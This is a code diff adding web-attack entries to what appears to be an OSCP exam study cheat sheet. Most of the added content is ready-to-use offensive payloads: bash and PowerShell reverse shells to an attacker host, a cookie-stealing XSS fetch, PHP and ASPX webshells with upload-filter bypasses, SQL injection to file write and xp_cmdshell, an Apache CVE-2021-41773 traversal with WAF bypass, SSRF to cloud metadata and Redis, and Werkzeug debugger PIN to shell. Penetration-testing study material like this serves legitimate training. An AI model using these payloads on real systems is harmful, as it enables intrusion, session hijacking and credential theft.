@@ -40,6 +40,15 @@ const web: OscpContent = {
                     label: 'ffuf Host header (filter by size)',
                     code: 'ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs <baseline-size>',
                 },
+                {
+                    label: 'gobuster vhost',
+                    code: 'gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain',
+                },
+                {
+                    label: 'Pin a vhost in /etc/hosts',
+                    code: `echo '<target-ip>  <vhost>.<domain>' | sudo tee -a /etc/hosts
+curl -sI http://<vhost>.<domain>`,
+                },
             ],
             tags: ['vhost', 'subdomain', 'host-header', 'ffuf'],
         },
@@ -51,6 +60,22 @@ const web: OscpContent = {
             os: 'agnostic',
             description:
                 'Try default and guessable creds first, then a targeted brute of the POST form. Watch for SQLi auth bypass in the same field.',
+            commands: [
+                {
+                    label: 'Default / guessable creds',
+                    code: `curl -s -X POST http://<target>/login -d 'username=admin&password=admin'
+# try admin:admin, admin:password, root:root, <app>:admin`,
+                },
+                {
+                    label: 'Hydra the POST form',
+                    code: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"',
+                },
+                {
+                    label: 'SQLi auth bypass',
+                    code: `username: admin' OR 1=1-- -
+password: x`,
+                },
+            ],
             tags: ['login', 'admin', 'auth', 'panel'],
         },
         {
@@ -60,7 +85,7 @@ const web: OscpContent = {
             phase: 'web',
             os: 'agnostic',
             description:
-                'A parameter includes a file path. Read /etc/passwd (user list), dump PHP source via php://filter (find creds/DB strings), or escalate to RCE via log poisoning or /proc/self/environ.',
+                'A parameter includes a file path. Read /etc/passwd (user list), dump PHP source via php://filter (find creds/DB strings), or escalate to RCE via log poisoning or /proc/self/environ. For Apache 2.4.49, CVE-2021-41773 adds path traversal to RCE; on Flask, the Werkzeug debugger PIN is a straight shot at code execution.',
             commands: [
                 {
                     label: 'Read + source dump',
@@ -72,8 +97,13 @@ curl "http://<target>/?page=php://filter/convert.base64-encode/resource=config"`
                     code: `curl -A "<?php system(\\$_GET['c']); ?>" http://<target>/
 curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                 },
+                {
+                    label: 'Apache CVE-2021-41773 + WAF bypass',
+                    code: `curl "http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+curl "http://<target>/cgi-bin/.%252e/.%252e/.%252e/etc/passwd"`,
+                },
             ],
-            tags: ['lfi', 'traversal', 'php-filter', 'log-poison'],
+            tags: ['lfi', 'traversal', 'php-filter', 'log-poison', 'waf', 'cve-2021-41773'],
         },
         {
             id: 'sqli',
@@ -93,6 +123,21 @@ curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                     code: `' ORDER BY 5-- -
 ' UNION SELECT 1,2,group_concat(user,':',password),4,5 FROM users-- -`,
                 },
+                {
+                    label: 'Confirm + time-based',
+                    code: `' OR SLEEP(5)-- -
+' AND 1=1-- -    vs    ' AND 1=2-- -`,
+                },
+                {
+                    label: 'sqlmap (when allowed)',
+                    code: `sqlmap -u 'http://<target>/item.php?id=1' --batch --dbs
+sqlmap -u 'http://<target>/item.php?id=1' -D <db> -T users --dump`,
+                },
+                {
+                    label: 'MySQL INTO OUTFILE / MSSQL xp_cmdshell',
+                    code: `' UNION SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/sh.php'-- -
+'; EXEC xp_cmdshell 'whoami';--`,
+                },
             ],
             tags: ['sqli', 'union', 'sqlmap', 'auth-bypass', 'injection'],
         },
@@ -108,6 +153,16 @@ curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                 {
                     label: 'Separators + reverse shell',
                     code: '; id | ; bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"\n`id`  $(id)  %0a id',
+                },
+                {
+                    label: 'Blind OOB confirm',
+                    code: `; ping -c 3 <kali-ip>
+; nslookup $(whoami).<kali-ip>
+# listen: sudo tcpdump -i tun0 icmp`,
+                },
+                {
+                    label: 'Windows reverse shell',
+                    code: `& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<kali-ip>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb),0,$sb.Length)}"`,
                 },
             ],
             tags: ['command-injection', 'rce', 'shell'],
@@ -126,6 +181,18 @@ curl "http://<target>/?page=/var/log/apache2/access.log&c=id"`,
                     code: `echo '<?php system($_GET["c"]); ?>' > sh.php.jpg   # then fix ext / MIME
 curl "http://<target>/uploads/sh.php?c=id"`,
                 },
+                {
+                    label: 'Filter bypasses',
+                    code: `# double ext / case / null / .htaccess
+sh.php.jpg   sh.pHp   sh.php%00.jpg   sh.phar
+# .htaccess to force PHP:
+echo 'AddType application/x-httpd-php .jpg' > .htaccess`,
+                },
+                {
+                    label: 'ASPX / ASHX shell',
+                    code: `echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>' > sh.aspx
+# if .aspx blocked, try .ashx / .asmx / .config`,
+                },
             ],
             tags: ['upload', 'webshell', 'bypass', 'aspx', 'ashx'],
         },
@@ -137,6 +204,23 @@ curl "http://<target>/uploads/sh.php?c=id"`,
             os: 'agnostic',
             description:
                 'The server fetches a URL you control. Hit cloud metadata (169.254.169.254) for tokens, reach internal-only services, or use gopher:// to talk raw protocols (Redis/MySQL) for RCE.',
+            commands: [
+                {
+                    label: 'Local + metadata',
+                    code: `curl "http://<target>/?url=http://127.0.0.1:80"
+curl "http://<target>/?url=http://169.254.169.254/latest/meta-data/"
+curl "http://<target>/?url=file:///etc/passwd"`,
+                },
+                {
+                    label: 'Internal port fuzz',
+                    code: "ffuf -u 'http://<target>/?url=http://127.0.0.1:FUZZ' -w /usr/share/seclists/Fuzzing/PORT-Numbers.txt -fs <baseline-size>",
+                },
+                {
+                    label: 'gopher -> Redis RCE',
+                    code: `# URL-encode a Redis protocol payload, then:
+curl "http://<target>/?url=gopher://127.0.0.1:6379/_<encoded>"`,
+                },
+            ],
             tags: ['ssrf', 'metadata', 'gopher', 'internal'],
         },
         {
@@ -147,6 +231,18 @@ curl "http://<target>/uploads/sh.php?c=id"`,
             os: 'agnostic',
             description:
                 "Change a numeric/predictable ID to reach another user's data. Combine with mass-assignment (add admin:true on register) or a password-reset flaw for account takeover.",
+            commands: [
+                {
+                    label: 'Numeric ID walk',
+                    code: `ffuf -u 'http://<target>/api/user?id=FUZZ' -w <(seq 1 200) -mc 200 -fs <baseline-size>
+curl -b 'session=<cookie>' http://<target>/profile?id=1`,
+                },
+                {
+                    label: 'Mass-assignment / hidden field',
+                    code: `curl -X POST http://<target>/register -d 'user=me&pass=x&admin=true&role=admin'
+# replay the request with an extra privileged key from the JS / API docs`,
+                },
+            ],
             tags: ['idor', 'access-control', 'mass-assignment'],
         },
         {
@@ -157,7 +253,94 @@ curl "http://<target>/uploads/sh.php?c=id"`,
             os: 'agnostic',
             description:
                 "Rarely the direct win on OSCP, but stored XSS can steal an admin session cookie -> hijack -> upload a webshell. Can also coerce NetNTLMv2 by pointing a victim at a UNC path.",
+            commands: [
+                {
+                    label: 'Cookie steal (stored)',
+                    code: `<script>fetch('http://<kali-ip>/?c='+document.cookie)</script>
+# listener: python3 -m http.server 80`,
+                },
+                {
+                    label: 'UNC coerce via XSS',
+                    code: `<img src="\\\\<kali-ip>\\share">
+# catch NetNTLMv2 with responder -I tun0`,
+                },
+            ],
             tags: ['xss', 'cookie', 'session', 'stored'],
+        },
+        {
+            id: 'git-exposure',
+            title: 'Exposed .git repository',
+            type: 'finding',
+            phase: 'web',
+            os: 'agnostic',
+            description:
+                'A reachable .git/ directory (or a .gitignore revealing hidden paths) leaks the full source history. Dump it and grep the history for hardcoded secrets, API keys, and the framework/version for a CVE.',
+            commands: [
+                {
+                    label: 'Dump and mine the repo',
+                    code: `git-dumper http://<target>/.git/ ./site-git
+git -C ./site-git log -p | grep -iE 'password|secret|api|key|token'`,
+                },
+                {
+                    label: 'Manual .git dump',
+                    code: `curl -s http://<target>/.git/HEAD
+curl -s http://<target>/.git/config
+wget --mirror -I .git http://<target>/.git/`,
+                },
+                {
+                    label: 'Recover a deleted secret',
+                    code: `git -C ./site-git log --all --full-history -- '*.env' '*.php' '*.config'
+git -C ./site-git show HEAD:config.php`,
+                },
+            ],
+            tags: ['git', 'source', 'secrets', 'git-dumper'],
+        },
+        {
+            id: 'webdav',
+            title: 'WebDAV enabled',
+            type: 'finding',
+            phase: 'web',
+            os: 'agnostic',
+            description:
+                'The server answers PUT/MOVE on a DAV-enabled directory. Upload a script (often .txt, then MOVE it to .php/.aspx) and browse to it for a webshell.',
+            commands: [
+                {
+                    label: 'Discover + upload',
+                    code: `davtest -url http://<target>/dav/
+cadaver http://<target>/dav/   # put sh.txt, then: move sh.txt sh.php`,
+                },
+                {
+                    label: 'PUT then MOVE',
+                    code: `curl -T sh.txt http://<target>/dav/sh.txt
+curl -X MOVE -H 'Destination: http://<target>/dav/sh.php' http://<target>/dav/sh.txt
+curl 'http://<target>/dav/sh.php?c=id'`,
+                },
+            ],
+            tags: ['webdav', 'davtest', 'cadaver', 'put'],
+        },
+        {
+            id: 'werkzeug-debugger-pin',
+            title: 'Werkzeug / Flask debugger PIN',
+            type: 'technique',
+            phase: 'web',
+            os: 'linux',
+            description:
+                'A Flask app running with debug=True exposes the Werkzeug interactive console on error pages. Reconstruct the PIN from machine-id, MAC, and process paths, then run Python as the app user and drop a reverse shell.',
+            commands: [
+                {
+                    label: 'PIN -> RCE',
+                    code: `cat /proc/sys/kernel/random/boot_id
+cat /proc/net/arp
+# feed into a Werkzeug PIN generator, then in the console:
+import os; os.system('bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"')`,
+                },
+                {
+                    label: 'Trigger the console',
+                    code: `curl -s http://<target>/console
+# or force an exception, then open /console in the browser`,
+                },
+            ],
+            tags: ['werkzeug', 'flask', 'debug', 'pin', 'rce'],
         },
     ],
     edges: [
@@ -184,6 +367,14 @@ curl "http://<target>/uploads/sh.php?c=id"`,
         { from: 'idor', to: 'creds-found', label: "other user's secrets" },
         { from: 'xss', to: 'file-upload', label: 'admin cookie -> panel' },
         { from: 'xss', to: 'netntlm-captured', label: 'coerce UNC auth' },
+        { from: 'web-dirbust', to: 'git-exposure', label: '.git / .gitignore leaked' },
+        { from: 'git-exposure', to: 'creds-found', label: 'secrets in history' },
+        { from: 'git-exposure', to: 'public-exploit-search', label: 'framework/version for a CVE' },
+        { from: 'web-dirbust', to: 'webdav', label: 'DAV methods allowed' },
+        { from: 'webdav', to: 'webshell-upload', label: 'PUT + MOVE webshell' },
+        { from: 'lfi', to: 'werkzeug-debugger-pin', label: 'Flask debug console exposed' },
+        { from: 'werkzeug-debugger-pin', to: 'foothold-linux', label: 'PIN console -> RCE' },
+        { from: 'login-form-found', to: 'creds-found', label: 'default/weak creds work' },
     ],
 }
 
